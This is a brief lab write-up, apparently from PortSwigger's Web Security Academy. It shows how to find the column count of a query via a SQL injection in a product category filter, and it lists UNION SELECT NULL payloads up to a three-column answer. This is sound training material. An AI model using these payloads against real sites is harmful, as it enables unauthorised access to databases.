# Lab: SQL injection UNION attack, determining the number of columns returned by the query

**End Goal:** Determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values

**Analysis**

*The SQL injection vulnerability is in the product category filter so let's add ' after the category to see if the page breaks*

https://0aa800070406644081b4b143006600ad.web-security-academy.net/filter?category=Accessories%27

*The page broke. So the injection works. Now check how many columns are there. Generally I'd use ORDER BY, but this lab specifically asks to return an additional row containing null values.*

' UNION SELECT NULL-- -

*Returns error*

' UNION SELECT NULL, NULL-- -

*Returns error*

**Answer:** 

' UNION SELECT NULL, NULL, NULL-- -

